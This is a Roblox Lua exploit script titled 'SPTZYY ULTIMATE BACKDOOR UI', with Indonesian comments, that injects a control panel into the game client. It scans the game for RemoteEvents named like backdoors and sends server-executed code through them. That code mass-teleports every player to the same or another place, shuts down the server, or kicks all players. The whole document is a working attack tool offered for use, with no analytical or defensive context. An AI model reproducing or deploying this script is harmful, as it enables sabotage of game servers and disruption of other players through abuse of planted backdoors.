-- [[ SPTZYY ULTIMATE BACKDOOR UI ]] --
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local lp = Players.LocalPlayer

-- [[ UI SETUP: MODERN DARK THEME ]] --
local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
ScreenGui.Name = "SptzyyBackdoorV2"

-- 1. Floating Icon
local IconButton = Instance.new("ImageButton", ScreenGui)
IconButton.Size = UDim2.new(0, 55, 0, 55)
IconButton.Position = UDim2.new(0.05, 0, 0.2, 0)
IconButton.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
IconButton.Image = "rbxassetid://6031289129" -- Portal Icon
IconButton.BorderSizePixel = 0
local IconCorner = Instance.new("UICorner", IconButton)
IconCorner.CornerRadius = UDim.new(1, 0)
local IconStroke = Instance.new("UIStroke", IconButton)
IconStroke.Color = Color3.fromRGB(255, 0, 0)
IconStroke.Thickness = 2

-- 2. Main Menu Frame
local MainFrame = Instance.new("Frame", ScreenGui)
MainFrame.Size = UDim2.new(0, 260, 0, 320)
MainFrame.Position = UDim2.new(0.5, -130, 0.4, 0)
MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
MainFrame.Visible = false
MainFrame.BorderSizePixel = 0
local MainCorner = Instance.new("UICorner", MainFrame)

local Title = Instance.new("TextLabel", MainFrame)
Title.Size = UDim2.new(1, 0, 0, 45)
Title.Text = "SPTZY SERVER CONTROL"
Title.TextColor3 = Color3.new(1, 1, 1)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 14
Title.BackgroundTransparency = 1

local StatusLabel = Instance.new("TextLabel", MainFrame)
StatusLabel.Size = UDim2.new(1, 0, 0, 25)
StatusLabel.Position = UDim2.new(0, 0, 0.12, 0)
StatusLabel.Text = "SCANNING FOR BACKDOOR..."
StatusLabel.TextColor3 = Color3.fromRGB(255, 165, 0)
StatusLabel.Font = Enum.Font.GothamMedium
StatusLabel.TextSize = 10
StatusLabel.BackgroundTransparency = 1

-- 3. Container Button (Scrolling)
local Scroll = Instance.new("ScrollingFrame", MainFrame)
Scroll.Size = UDim2.new(0.9, 0, 0.7, 0)
Scroll.Position = UDim2.new(0.05, 0, 0.22, 0)
Scroll.BackgroundTransparency = 1
Scroll.BorderSizePixel = 0
Scroll.CanvasSize = UDim2.new(0, 0, 1.2, 0)
Scroll.ScrollBarThickness = 2

local UIList = Instance.new("UIListLayout", Scroll)
UIList.Padding = UDim.new(0, 8)
UIList.HorizontalAlignment = Enum.HorizontalAlignment.Center

--- [[ FUNGSI CORE ]] ---

local foundRemote = nil

local function createFeatureBtn(text, color, callback)
    local btn = Instance.new("TextButton", Scroll)
    btn.Size = UDim2.new(1, 0, 0, 40)
    btn.BackgroundColor3 = color
    btn.Text = text
    btn.Font = Enum.Font.GothamBold
    btn.TextColor3 = Color3.new(1, 1, 1)
    btn.TextSize = 12
    Instance.new("UICorner", btn)
    
    btn.MouseButton1Click:Connect(callback)
    return btn
end

-- Scan Remote yang bisa "Culik" atau Eksekusi
local function startScan()
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") then
            -- Nama-nama remote yang biasanya jadi celah backdoor
            local n = v.Name:lower()
            if n:find("main") or n:find("remote") or n:find("execute") or n:find("admin") then
                foundRemote = v
                StatusLabel.Text = "BACKDOOR FOUND: "..v.Name
                StatusLabel.TextColor3 = Color3.fromRGB(0, 255, 150)
                IconStroke.Color = Color3.fromRGB(0, 255, 150)
                break
            end
        end
    end
    if not foundRemote then
        StatusLabel.Text = "NO BACKDOOR DETECTED (FE ACTIVE)"
    end
end

-- [[ DAFTAR FITUR PERMINTAAN ]] --

-- FITUR 1: CULIK ALL (MASS REJOIN)
createFeatureBtn("CULIK ALL (REJOIN)", Color3.fromRGB(200, 40, 40), function()
    if foundRemote then
        local code = "local TS = game:GetService('TeleportService') for _,v in pairs(game.Players:GetPlayers()) do TS:Teleport(game.PlaceId, v) end"
        foundRemote:FireServer(code)
    else
        print("Gagal: Remote tidak ditemukan.")
    end
end)

-- FITUR 2: CULIK KE MAP LAIN
createFeatureBtn("CULIK TO OTHER MAP", Color3.fromRGB(0, 100, 200), function()
    if foundRemote then
        -- Ganti ID 185655149 dengan ID Map tujuanmu
        local code = "local TS = game:GetService('TeleportService') for _,v in pairs(game.Players:GetPlayers()) do TS:Teleport(185655149, v) end"
        foundRemote:FireServer(code)
    end
end)

-- FITUR 3: SHUTDOWN SERVER
createFeatureBtn("SHUTDOWN SERVER", Color3.fromRGB(50, 50, 50), function()
    if foundRemote then
        foundRemote:FireServer("game:Shutdown()")
    end
end)

-- FITUR 4: MASS KICK
createFeatureBtn("MASS KICK ALL", Color3.fromRGB(150, 0, 0), function()
    if foundRemote then
        foundRemote:FireServer("for _,v in pairs(game.Players:GetPlayers()) do v:Kick('Sptzyy Control') end")
    end
end)

--- [[ LOGIKA UI ]] ---

-- Toggle Menu
IconButton.MouseButton1Click:Connect(function()
    MainFrame.Visible = not MainFrame.Visible
end)

-- Dragging Logic
local function drag(obj)
    local dragging, input, startPos, startInput
    obj.InputBegan:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
            dragging = true; startInput = i.Position; startPos = obj.Position
        end
    end)
    UserInputService.InputChanged:Connect(function(i)
        if dragging and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
            local delta = i.Position - startInput
            obj.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
    UserInputService.InputEnded:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then dragging = false end
    end)
end

drag(MainFrame)
drag(IconButton)

-- Jalankan Scan otomatis
task.spawn(startScan)
